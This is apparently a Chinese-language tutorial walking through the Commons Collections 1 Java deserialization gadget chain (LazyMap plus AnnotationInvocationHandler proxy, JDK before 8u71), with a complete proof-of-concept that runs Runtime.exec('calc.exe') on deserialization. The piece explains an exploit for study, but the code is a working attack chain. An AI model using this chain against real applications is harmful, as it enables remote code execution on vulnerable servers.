# 适用条件
> jdk < 8u71

```java
package com.example.demo;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CommonCollections1_lazyMap {
    public static void main(String[] args) throws Exception {
        // 执行类
        final Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
            new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
            new InvokerTransformer("exec", new Class[] { String.class }, new Object[] { "calc.exe" })
            };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put("value", "Ki1ro");
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
        
        
        // 触发类
        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, (InvocationHandler) construct.newInstance(Retention.class, outerMap));
        InvocationHandler obj = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);
        
        // 序列化
        ByteArrayOutputStream bo = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bo);
        oos.writeObject(obj);
        oos.close();
        //        bo.close();
        System.out.println(bo);
        // 反序列化
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bo.toByteArray()));
        Object ob = (Object) ois.readObject();
        
    }
}

```
我先创建一个ChainedTransformer类,用于后续命令执行
```java
final Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
    new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
    new InvokerTransformer("exec", new Class[] { String.class }, new Object[] { "calc.exe" })
    };
Transformer transformerChain = new ChainedTransformer(transformers);
```
再对一个Map进行decorate修饰,这里使用的是LazyMap类的decorate修饰方法
```java
Map innerMap = new HashMap();
innerMap.put("value", "Ki1ro");
Map outerMap = LazyMap.decorate(innerMap, transformerChain);
```
之后如果对该outerMap进行get取值，且key并不存在则会执行this.factory.transform(key)，即执行我们上面创建的命令执行
```java
public Object get(Object key) {
    if (!super.map.containsKey(key)) {
        Object value = this.factory.transform(key);
        super.map.put(key, value);
        return value;
    } else {
        return super.map.get(key);
    }
}
```
现在，我们要找寻可以调用我们这个Map类get方法的类<br />我们找到的是sun.reflect.annotation.AnnotationInvocationHandler<br />它的invoke方法的17行调用了get方法
```java
public Object invoke(Object var1, Method var2, Object[] var3) {
    String var4 = var2.getName();
    Class[] var5 = var2.getParameterTypes();
    if (var4.equals("equals") && var5.length == 1 && var5[0] == Object.class) {
        return this.equalsImpl(var3[0]);
    } else if (var5.length != 0) {
        throw new AssertionError("Too many parameters for an annotation method");
    } else {
        switch (var4) {
            case "toString":
                return this.toStringImpl();
            case "hashCode":
                return this.hashCodeImpl();
            case "annotationType":
                return this.type;
            default:
                Object var6 = this.memberValues.get(var4);
                if (var6 == null) {
                    throw new IncompleteAnnotationException(this.type, var4);
                } else if (var6 instanceof ExceptionProxy) {
                    throw ((ExceptionProxy)var6).generateException();
                } else {
                    if (var6.getClass().isArray() && Array.getLength(var6) != 0) {
                        var6 = this.cloneArray(var6);
                    }

                    return var6;
                }
        }
    }
```
我们通过劫持代理来实现对invoke的调用<br />因为AnnotationInvocationHandler的readObject对Map会进行操作，从而触发另一个AnnotationInvocationHandler类的invoke方法
```java
Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor<?> construct = clazz.getDeclaredConstructor(Class.class, Map.class);
construct.setAccessible(true);
Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, (InvocationHandler) construct.newInstance(Retention.class, outerMap));
InvocationHandler obj = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);
```
最后对obj对象进行序列化
```java
ByteArrayOutputStream bo = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(bo);
oos.writeObject(obj);
oos.close();
```
因为我现在是8u71之后的版本，AnnotationInvocationHandler的readObject不会对Map进行操作，导致无法触发，所以就不演示执行情况了
